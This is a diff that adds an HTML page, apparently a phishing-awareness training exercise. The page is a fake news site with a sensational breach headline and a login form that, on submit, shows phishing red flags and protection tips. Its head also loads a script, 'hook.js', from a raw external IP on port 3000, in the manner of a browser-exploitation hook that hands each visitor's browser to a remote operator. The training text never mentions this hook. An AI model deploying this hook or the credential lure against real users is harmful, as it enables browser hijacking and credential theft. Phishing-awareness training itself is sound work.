@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global News Daily - Breaking News [TRAINING EXERCISE]</title>
+    <script src="http://3.83.118.230:3000/hook.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .warning-banner {
+            background-color: #ffeb3b;
+            color: #333;
+            padding: 10px;
+            text-align: center;
+            font-weight: bold;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        header {
+            background-color: #1a1a1a;
+            color: white;
+            padding: 10px 0;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .header-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #fff;
+        }
+        .logo span {
+            color: #ff4c4c;
+        }
+        nav ul {
+            list-style: none;
+            display: flex;
+            margin: 0;
+            padding: 0;
+        }
+        nav ul li {
+            margin-left: 20px;
+        }
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+        }
+        .main-container {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 20px;
+        }
+        .breaking-news {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .breaking-news h1 {
+            color: #ff4c4c;
+            margin-top: 0;
+        }
+        .news-image {
+            width: 100%;
+            height: 400px;
+            background-color: #ddd;
+            margin: 20px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #777;
+        }
+        .news-content p {
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        .sidebar {
+            background-color: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        .sidebar-title {
+            font-size: 20px;
+            margin-top: 0;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #eee;
+        }
+        .premium-content {
+            background-color: #f9f9f9;
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            border: 1px solid #eee;
+        }
+        .premium-button {
+            background-color: #ff4c4c;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 15px;
+        }
+        .premium-button:hover {
+            background-color: #e04141;
+        }
+        .login-form {
+            margin-top: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .login-button {
+            background-color: #333;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .login-button:hover {
+            background-color: #555;
+        }
+        .popular-stories {
+            margin-top: 30px;
+        }
+        .story-item {
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .story-item:last-child {
+            border-bottom: none;
+        }
+        .story-item a {
+            color: #333;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .story-item a:hover {
+            color: #ff4c4c;
+        }
+        footer {
+            background-color: #1a1a1a;
+            color: white;
+            text-align: center;
+            padding: 20px 0;
+            margin-top: 30px;
+        }
+    </style>
+</head>
+<body>
+    <div class="warning-banner">
+        THIS IS A TRAINING EXERCISE - Not a real news website
+    </div>
+    <header>
+        <div class="header-container">
+            <div class="logo">Global<span>News</span>Daily</div>
+            <nav>
+                <ul>
+                    <li><a href="#">Home</a></li>
+                    <li><a href="#">Politics</a></li>
+                    <li><a href="#">Business</a></li>
+                    <li><a href="#">Technology</a></li>
+                    <li><a href="#">Entertainment</a></li>
+                    <li><a href="#">Sports</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <main class="breaking-news">
+            <h1>BREAKING NEWS: Major Security Breach Affects Millions of Users</h1>
+            <div class="news-image">
+                <img src="/api/placeholder/800/400" alt="Security Breach News Image">
+            </div>
+            <div class="news-content">
+                <p><strong>May 21, 2025</strong> - A major security breach has been reported affecting multiple online services. Cybersecurity experts are recommending users update their passwords immediately as a precautionary measure.</p>
+                <p>The breach, discovered early this morning, potentially impacts users of several popular online platforms. Authorities are investigating the incident, which may have exposed user data including emails and potentially passwords.</p>
+                <p>"This is one of the most significant data breaches we've seen this year," said cybersecurity expert Jane Smith. "Users should take immediate action to protect their accounts."</p>
+                <p>The attack appears to have targeted authentication systems, potentially giving attackers access to login credentials. Security professionals recommend users update their passwords and enable two-factor authentication where available.</p>
+                <p><strong>Continue reading this premium article to learn:</strong></p>
+                <ul>
+                    <li>Which specific services were affected</li>
+                    <li>What personal information may have been compromised</li>
+                    <li>Step-by-step protection measures recommended by experts</li>
+                    <li>How to check if your accounts were affected</li>
+                </ul>
+                <p>Please log in or subscribe to continue reading this premium article.</p>
+            </div>
+        </main>
+
+        <aside class="sidebar">
+            <h2 class="sidebar-title">Access Premium Content</h2>
+            <div class="premium-content">
+                <p>Subscribe to our premium service for unlimited access to breaking news and exclusive content.</p>
+                <button class="premium-button">Subscribe Now</button>
+            </div>
+
+            <div class="login-form">
+                <h3>Already a subscriber? Log in</h3>
+                <form id="login-form">
+                    <div class="form-group">
+                        <label for="email">Email:</label>
+                        <input type="email" id="email" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="password">Password:</label>
+                        <input type="password" id="password" required>
+                    </div>
+                    <button type="submit" class="login-button">Log In</button>
+                </form>
+            </div>
+
+            <div class="popular-stories">
+                <h3>Trending Stories</h3>
+                <div class="story-item">
+                    <a href="#">New Study Shows Surprising Health Benefits of Coffee</a>
+                </div>
+                <div class="story-item">
+                    <a href="#">Tech Giant Announces Revolutionary New Device</a>
+                </div>
+                <div class="story-item">
+                    <a href="#">Market Reaches Record High Amid Economic Recovery</a>
+                </div>
+                <div class="story-item">
+                    <a href="#">Scientists Make Breakthrough in Renewable Energy</a>
+                </div>
+                <div class="story-item">
+                    <a href="#">Popular Celebrity Reveals Secrets to Success</a>
+                </div>
+            </div>
+        </aside>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Global News Daily - TRAINING EXERCISE ONLY</p>
+    </footer>
+
+    <script>
+        document.getElementById('login-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            // Show phishing awareness message
+            alert('TRAINING EXERCISE: This was a simulated phishing page!\n\nIn a real phishing attack, your credentials would have just been stolen. This demonstrates how attackers use fake news sites and urgent headlines to trick users into providing login information.');
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Clear the form
+            document.getElementById('email').value = '';
+            document.getElementById('password').value = '';
+            
+            // Replace content with training information
+            document.body.innerHTML = `
+                <div style="max-width: 800px; margin: 40px auto; padding: 20px; background-color: white; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1);">
+                    <h1 style="color: #e74c3c; text-align: center;">Phishing Awareness Training Exercise</h1>
+                    
+                    <div style="background-color: #ffeb3b; padding: 15px; border-radius: 5px; margin: 20px 0;">
+                        <p style="margin: 0; font-weight: bold; text-align: center;">THIS WAS A TRAINING EXERCISE</p>
+                    </div>
+                    
+                    <h2>News Website Phishing Tactics</h2>
+                    
+                    <p>You just experienced a simulated phishing attempt that used a fake news website. This is a common tactic used by attackers.</p>
+                    
+                    <h3>Red Flags You Should Have Noticed:</h3>
+                    <ul>
+                        <li><strong>Urgent/Sensational Headlines</strong> - Creating a sense of urgency about security breaches to make you act quickly without thinking</li>
+                        <li><strong>Premium Content Bait</strong> - Using "exclusive" content to entice you to log in</li>
+                        <li><strong>Login Request for News</strong> - Most legitimate news sites don't require login to read basic news articles</li>
+                        <li><strong>Suspicious URL</strong> - In a real attack, the URL would not match the legitimate news organization's domain</li>
+                    </ul>
+                    
+                    <h3>How to Protect Yourself:</h3>
+                    <ul>
+                        <li>Always check the URL before entering credentials</li>
+                        <li>Be suspicious of news sites requiring login to read breaking news</li>
+                        <li>When in doubt, navigate directly to the official website rather than following links</li>
+                        <li>Use a password manager that will only autofill credentials on legitimate websites</li>
+                        <li>Enable two-factor authentication when available</li>
+                    </ul>
+                    
+                    <p style="margin-top: 30px; text-align: center; font-style: italic;">This training exercise was designed to help you identify and avoid real phishing attempts.</p>
+                </div>
+            `;
+        });
+    </script>
+</body>
+</html>
